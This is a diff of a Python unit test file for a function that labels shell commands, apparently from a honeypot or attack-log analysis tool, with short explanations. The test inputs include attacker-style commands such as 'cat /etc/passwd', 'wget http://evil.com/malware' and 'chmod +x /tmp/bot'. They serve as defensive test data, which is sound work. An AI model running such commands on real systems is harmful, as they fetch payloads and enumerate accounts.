@@ -97,16 +97,16 @@ class TestAnalyzeEvents:
 
 
 class TestAnnotateCommand:
-    """Test command annotation dictionary."""
+    """annotate_command delegates to explain.explain (see test_explain.py)."""
 
     def test_known_commands(self):
-        assert generate.annotate_command('uname -a') == 'OS/kernel identification'
-        assert generate.annotate_command('cat /etc/passwd') == 'user enumeration'
-        assert generate.annotate_command('whoami') == 'privilege check'
+        assert generate.annotate_command('uname -a') == 'identifies the OS'
+        assert generate.annotate_command('cat /etc/passwd') == 'lists user accounts'
+        assert generate.annotate_command('whoami') == 'checks its privileges'
 
     def test_pattern_match(self):
-        assert generate.annotate_command('wget http://evil.com/malware') == 'payload download from C2'
-        assert generate.annotate_command('chmod +x /tmp/bot') == 'make executable'
+        assert generate.annotate_command('wget http://evil.com/malware') == 'downloads a payload'
+        assert generate.annotate_command('chmod +x /tmp/bot') == 'makes a file executable'
 
     def test_unknown_command(self):
         assert generate.annotate_command('some_custom_thing --flag') is None
